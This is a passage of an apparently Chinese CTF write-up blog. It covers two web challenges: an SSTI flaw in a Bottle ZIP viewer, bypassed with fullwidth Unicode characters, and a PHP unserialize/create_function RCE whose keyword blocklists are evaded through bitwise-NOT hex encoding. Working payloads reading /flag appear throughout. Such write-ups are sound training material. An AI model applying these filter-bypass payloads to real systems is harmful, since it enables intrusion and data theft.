&lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;⚡&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;快速处理&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;高效处理小于1MB的ZIP文件，快速获取内容&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_page</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;上传页面&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;上传ZIP文件&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;📦 ZIP文件查看器&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header bg-primary text-white&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4 class=&quot;mb-0&quot;&gt;📤 上传ZIP文件&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;upload-form&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class=&quot;mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;label for=&quot;fileInput&quot; class=&quot;form-label&quot;&gt;选择ZIP文件（最大1MB）&lt;/label&gt;</span></span><br><span class="line"><span class="string">                                &lt;input class=&quot;form-control&quot; type=&quot;file&quot; name=&quot;file&quot; id=&quot;fileInput&quot; accept=&quot;.zip&quot; required&gt;</span></span><br><span class="line"><span class="string">                                &lt;div class=&quot;form-text&quot;&gt;仅支持.zip格式的文件，且文件大小不超过1MB&lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary w-100&quot;&gt;</span></span><br><span class="line"><span class="string">                                📤 上传文件</span></span><br><span class="line"><span class="string">                            &lt;/button&gt;</span></span><br><span class="line"><span class="string">                        &lt;/form&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;text-center mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/&quot; class=&quot;btn btn-outline-secondary&quot;&gt;</span></span><br><span class="line"><span class="string">                        ↩️ 返回首页</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;处理文件上传&quot;&quot;&quot;</span></span><br><span class="line">    zip_file = request.files.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> zip_file <span class="keyword">or</span> <span class="keyword">not</span> zip_file.filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;请上传有效的ZIP文件&#x27;</span></span><br><span class="line">    </span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>, <span class="number">2</span>)  </span><br><span class="line">    file_size = zip_file.file.tell()</span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>)  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;文件大小超过限制(<span class="subst">&#123;MAX_FILE_SIZE/<span class="number">1024</span>/<span class="number">1024</span>&#125;</span>MB)&#x27;</span></span><br><span class="line">    </span><br><span class="line">    timestamp = <span class="built_in">str</span>(time.time())</span><br><span class="line">    unique_str = zip_file.filename + timestamp</span><br><span class="line">    dir_hash = hashlib.md5(unique_str.encode()).hexdigest()</span><br><span class="line">    extract_dir = os.path.join(UPLOAD_DIR, dir_hash)</span><br><span class="line">    os.makedirs(extract_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    zip_path = os.path.join(extract_dir, <span class="string">&#x27;uploaded.zip&#x27;</span>)</span><br><span class="line">    zip_file.save(zip_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        safe_extract_zip(zip_path, extract_dir)</span><br><span class="line">    <span class="keyword">except</span> (zipfile.BadZipFile, ValueError) <span class="keyword">as</span> e:</span><br><span class="line">        shutil.rmtree(extract_dir) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;处理ZIP文件时出错: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span></span><br><span class="line">    </span><br><span class="line">    files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(extract_dir) <span class="keyword">if</span> f != <span class="string">&#x27;uploaded.zip&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;上传成功&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;📦 ZIP文件查看器&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header bg-success text-white&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4 class=&quot;mb-0&quot;&gt;✅ 上传成功!&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;alert alert-success&quot; role=&quot;alert&quot;&gt;</span></span><br><span class="line"><span class="string">                            ✅ 文件已成功上传并解压</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        &lt;h5&gt;文件列表:&lt;/h5&gt;</span></span><br><span class="line"><span class="string">                        &lt;ul class=&quot;list-group mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                            % for file in files:</span></span><br><span class="line"><span class="string">                            &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;span&gt;📄 &#123;&#123;file&#125;&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                                &lt;a href=&quot;/view/&#123;&#123;dir_hash&#125;&#125;/&#123;&#123;file&#125;&#125;&quot; class=&quot;btn btn-sm btn-outline-primary&quot;&gt;</span></span><br><span class="line"><span class="string">                                    查看</span></span><br><span class="line"><span class="string">                                &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;/li&gt;</span></span><br><span class="line"><span class="string">                            % end</span></span><br><span class="line"><span class="string">                        &lt;/ul&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        % if files:</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;d-grid gap-2&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;/view/&#123;&#123;dir_hash&#125;&#125;/&#123;&#123;files[0]&#125;&#125;&quot; class=&quot;btn btn-primary&quot;&gt;</span></span><br><span class="line"><span class="string">                                👀 查看第一个文件</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        % end</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                &lt;div class=&quot;text-center mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/upload&quot; class=&quot;btn btn-outline-primary me-2&quot;&gt;</span></span><br><span class="line"><span class="string">                        ➕ 上传另一个文件</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/&quot; class=&quot;btn btn-outline-secondary&quot;&gt;</span></span><br><span class="line"><span class="string">                        🏠 返回首页</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, dir_hash=dir_hash, files=files)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/view/&lt;dir_hash&gt;/&lt;filename:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_file</span>(<span class="params">dir_hash, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_DIR, dir_hash, filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;文件不存在&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;请求的路径不是文件&quot;</span></span><br><span class="line">    </span><br><span class="line">    real_path = os.path.realpath(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> real_path.startswith(os.path.realpath(UPLOAD_DIR)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;非法访问尝试&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;latin-1&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;无法读取文件内容（可能是二进制文件）&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> contains_blacklist(content):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;文件内容包含不允许的关键词&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> template(content)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;渲染错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/static/&lt;filename:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serve_static</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;静态文件服务&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> static_file(filename, root=<span class="string">&#x27;static&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error404</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;讨厌啦不是说好只看看不摸的吗&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error500</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;不要透进来啊啊啊啊&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    os.makedirs(<span class="string">&#x27;static&#x27;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#原神，启动!</span></span><br><span class="line">    run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>在源码 <code>view_file</code> 函数中，直接将用户上传的文件内容传递给了 Bottle 框架的 <code>template()</code> 函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> template(content)</span><br></pre></td></tr></table></figure>

<p>这是一个典型的SSTI漏洞</p>
<p>但源码中定义了严格的 <code>BLACKLIST</code>，过滤了绝大多数小写字母（包括 <code>o</code>, <code>p</code>, <code>e</code>, <code>n</code>, <code>r</code>, <code>e</code>, <code>a</code>, <code>d</code> 等）以及特殊符号（<code>%</code>, <code>;</code>, <code>&lt;</code>, <code>&gt;</code> 等）。</p>
<p><strong>利用 Python 3 的 Unicode 标准化特性 (NFKC)</strong>。Python 3 解释器在解析代码时，会将<strong>全角字符</strong>和其他兼容字符标准化为对应的 ASCII 字符。</p>
<p>例如，Python 解释器执行时，<code>ｏｐｅｎ</code> 会被解析为 <code>open</code> 函数。</p>
<p>最终 Payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ｏｐｅｎ(<span class="string">&#x27;/flag&#x27;</span>).ｒｅａｄ() &#125;&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>在中文输入法状态下，按 <code>Shift + Space</code> 切换到“全角模式”，然后输入 <code>open</code> 和 <code>read</code>。</p>
</li>
<li><p>新建一个文本文件<code>payload.txt</code>，使用文本编辑器写入以下内容（注意全角和半角的混合）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ｏｐｅｎ(<span class="string">&#x27;/flag&#x27;</span>).ｒｅａｄ() &#125;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>将 <code>payload.txt</code> 压缩为 <code>payload.zip</code>后上传</p>
</li>
</ol>
<hr>
<h1 id="3-Bypass"><a href="#3-Bypass" class="headerlink" title="3. Bypass"></a>3. Bypass</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$a</span>.<span class="variable">$b</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>,<span class="variable">$b</span>))&#123;</span><br><span class="line">            <span class="variable">$a</span>(<span class="string">&quot;&quot;</span>, <span class="variable">$b</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Try again!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$blocked_a</span> = [<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;dl&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;escape&#x27;</span>, <span class="string">&#x27;er&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;ay&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;open&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$blocked_b</span> = [<span class="string">&#x27;find&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;pa&#x27;</span>, <span class="string">&#x27;proc&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;alter&#x27;</span>, <span class="string">&#x27;load&#x27;</span>, <span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;sort&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;sy&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$pattern_a</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_a</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="variable">$pattern_b</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_b</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_a</span>, <span class="variable">$a</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_b</span>, <span class="variable">$b</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$p</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>eval($a.$b);</code>放在<code>__construct</code> 里摸不到，这题可以通过调用create_function函数实现远程命令执行</p>
<p>由于create_function函数的特殊性，它不是直接运行你的代码，而是<strong>把代码包在一个函数定义里</strong>再去运行，例如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abcd</span>(<span class="params"></span>) </span>&#123; [代码] &#125;</span><br></pre></td></tr></table></figure>

<p>所以payloaad需要进行以<code>} [代码] //</code>的形式构造，闭合前面函数</p>
<p>黑名单 a：过滤了</p>
<p>‘eval’, ‘dl’, ‘ls’, ‘p’, ‘escape’, ‘er’, ‘str’, ‘cat’, ‘flag’, ‘file’, ‘ay’, ‘or’, ‘ftp’, ‘dict’, ‘..‘, ‘h’, ‘w’, ‘exec’, ‘s’, ‘open’</p>
<p>黑名单 b：过滤了</p>
<p>‘find’, ‘filter’, ‘c’, ‘pa’, ‘proc’, ‘dir’, ‘regexp’, ‘n’, ‘alter’, ‘load’, ‘grep’, ‘o’, ‘file’, ‘t’, ‘w’, ‘insert’, ‘sort’, ‘h’, ‘sy’, ‘..‘, ‘array’, ‘sh’, ‘touch’, ‘e’, ‘php’, ‘f’</p>
<p>可以联动无字母rce的知识，用取反绕过黑名单</p>
<p>但由于本题在绕过两个黑名单时是在php代码内部，而不是在url栏，所以不能采用url编码，可以采用十六进制转换</p>
<p>在kali终端采用命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&quot;echo bin2hex(~&#x27;system&#x27;);&quot;</span></span><br><span class="line">//8c868c8b9a92</span><br><span class="line">php -r <span class="string">&quot;echo bin2hex(~&#x27;cat /flag&#x27;);&quot;</span></span><br><span class="line">//9c9e8bdfd099939e98</span><br></pre></td></tr></table></figure>

<p>换成\xx形式，接着填入exp.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;create_function&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;&#125; (~\&quot;\x8c\x86\x8c\x8b\x9a\x92\&quot;)((~\&quot;\x9c\x9e\x8b\xdf\xd0\x99\x93\x9e\x98\&quot;)); //&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>));</span><br><span class="line"><span class="comment">//O%3A4%3A%22FLAG%22%3A2%3A%7Bs%3A7%3A%22%00FLAG%00a%22%3Bs%3A15%3A%22create_function%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A33%3A%22%7D+%28%7E%22%8C%86%8C%8B%9A%92%22%29%28%28%7E%22%9C%9E%8B%DF%D0%99%93%9E%98%22%29%29%3B+%2F%2F%22%3B%7D</span></span><br></pre></td></tr></table></figure>

<hr>
